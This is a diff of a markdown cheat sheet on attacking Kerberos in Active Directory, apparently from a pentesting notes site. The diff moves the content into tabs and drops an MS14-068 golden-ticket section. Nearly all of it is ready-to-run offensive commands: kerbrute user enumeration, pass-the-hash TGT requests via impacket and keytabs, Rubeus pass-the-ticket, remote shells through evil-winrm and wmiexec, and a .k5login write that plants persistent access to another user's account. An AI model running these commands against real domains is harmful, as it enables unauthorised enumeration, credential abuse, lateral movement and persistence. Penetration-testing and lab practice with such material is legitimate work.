@@ -1,33 +1,55 @@
 ---
 title: "Kerberos"
 date: 2024-7-2
-tags: ["kerberos", "kerbrute", "active directory", "ad", "domain controller", "Windows", "smb", "MS14-068", "golden ticket", "goldpac"]
+tags: ["kerberos", "kerbrute", "rubeus", "active directory", "ad", "domain controller", "Windows", "smb"]
 ---
 
 ---
-### Kerbrute
+### Users enum
 
-[kerbrute](https://github.com/ropnop/kerbrute)
+{{< tab set1 tab1 active >}}kerbrute{{< /tab >}}
+{{< tabcontent set1 tab1 >}}
+
+<div>
 
 ```bash
 kerbrute userenum --domain <DOMAIN> --dc <DC> usernames.txt
 ```
 
-#### Usernames generator
+</div>
 
-[username-anarchy](https://github.com/urbanadventurer/username-anarchy)
+<small>*Ref: [kerbrute](https://github.com/ropnop/kerbrute)*</small>
+
+{{< /tabcontent >}}
+
+### Usernames generator
+
+{{< tab set2 tab1 active >}}username-anarchy{{< /tab >}}
+{{< tabcontent set2 tab1 >}}
+
+<div>
 
 ```bash
 ./username-anarchy -i users.txt | tee usernames.txt
 ```
 
+</div>
+
+<small>*Ref: [username-anarchy](https://github.com/urbanadventurer/username-anarchy)*</small>
+
+{{< /tabcontent >}}
+
 <br>
 
 ---
 
-### Generate Kerberos Ticket (From Linux)
+### Generate Kerberos ticket (From Linux)
 
-#### Method #1: Using impacket
+{{< tab set3 tab1 active >}}Impacket{{< /tab >}}
+{{< tab set3 tab2 >}}Kinit{{< /tab >}}
+{{< tabcontent set3 tab1 >}}
+
+<div>
 
 ```bash
 sudo ntpdate -s <DC> && impacket-getTGT -hashes :<HASH> <DOMAIN>/administrator
@@ -42,7 +64,12 @@ export KRB5CCNAME=administrator.ccache
 klist
 ```
 
-#### Method #2 : Using kinit
+</div>
+
+{{< /tabcontent >}}
+{{< tabcontent set3 tab2 >}}
+
+<div>
 
 ```bash
 # Step 0: Installation
@@ -55,7 +82,7 @@ sudo apt install krb5-user cifs-utils
 ```
 
 ```bash
-# Step 2: Add domain controller as a DNS server to '/etc/resolv.conf'
+# Step 2: Add domain controller as a DNS server to '/etc/resolv.conf' [optional]
 nameserver 10.10.11.10
 ```
 
@@ -82,14 +109,22 @@ nameserver 10.10.11.10
 sudo ntpdate -s <DC>
 ```
 
-#### 2a. Without Creds
+</div>
+
+#### 2a. Without creds
+
+<div>
 
 ```bash
 # Generate kerberos ticket for user
 kinit <USER>
 ```
 
-#### 2b. With Hash
+</div>
+
+#### 2b. With NTLM hash
+
+<div>
 
 ```bash
 ktutil
@@ -115,64 +150,113 @@ exit
 kinit -V -k -t administrator.keytab -f administrator@<DOMAIN>
 ```
 
+</div>
+
 #### 3. Check ticket
+
+<div>
 
 ```bash
 klist
 ```
 
+</div>
+
+{{< /tabcontent >}}
+
+### Generate Kerberos ticket (From Windows)
+
+{{< tab set4 tab1 active >}}rubeus{{< /tab >}}
+{{< tabcontent set4 tab1 >}}
+
+<div>
+
+```powershell
+.\Rubeus.exe asktgt /user:<USER> /password:<PASSWORD> /enctype:AES256 /domain:<DOMAIN> /dc:<DC> /ptt /nowrap
+```
+
+</div>
+
+{{< /tabcontent >}}
+
 <br>
 
 ---
 
-### Remote to target with kerberos
 
-#### Method #1 : Using evil-winrm 
+### Winrm with Kerberos
+
+{{< tab set5 tab1 active >}}evil-winrm{{< /tab >}}
+{{< tab set5 tab2 >}}wmiexec{{< /tab >}}
+{{< tabcontent set5 tab1 >}}
+
+<div>
 
 ```bash
+# Step 1: Edit '/etc/krb5.conf'
+
+[libdefaults]
+    default_realm = <DOMAIN>
+
+[realms]
+    <DOMAIN> = {
+        kdc = <DC>:88
+        admin_server = <DC>
+        default_domain = <DOMAIN>
+    }
+    
+[domain_realm]
+    .domain.internal = <DOMAIN>
+    domain.internal = <DOMAIN>
+```
+
+
+```bash
+# Step 2: Connect
 sudo ntpdate -s <DC> && evil-winrm -i <TARGET_DOMAIN> -r <DOMAIN>
 ```
 
-#### Method #2 : Using wmiexec
+</div>
+
+{{< /tabcontent >}}
+{{< tabcontent set5 tab2 >}}
+
+<div>
 
 ```bash
 sudo ntpdate -s <DC> && impacket-wmiexec <DOMAIN>/administrator@<TARGET_DOMAIN> -k -no-pass
 ```
 
+</div>
+
+{{< /tabcontent >}}
+
 <br>
 
 ---
 
-### Connect to SMB with kerberos
+### Connect to SMB with Kerberos
+
+<div>
 
 ```bash
 sudo ntpdate -s <DC> && impacket-smbclient <DOMAIN>/<USER>@<TARGET_DOMAIN> -k -no-pass
 ```
 
+</div>
+
 <br>
 
 ---
 
-### Add Kerboros Access (Linux)
+### Add Kerberos Access in Linux
+
+<div>
 
 ```bash
 echo "<USER>@<DOMAIN>" > /home/<TARGET_USER>/.k5login
 ```
 
-<br>
-
----
-
-### MS14-068 (Forged Golden Ticket)
-
-```bash
-# With creds
-impacket-goldenPac '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>'
-```
-
-```bash
-# With hash
-impacket-goldenPac --hashes :hash '<DOMAIN>/<USER>@<TARGET_DOMAIN>'
-```
+</div>
 
 <br>
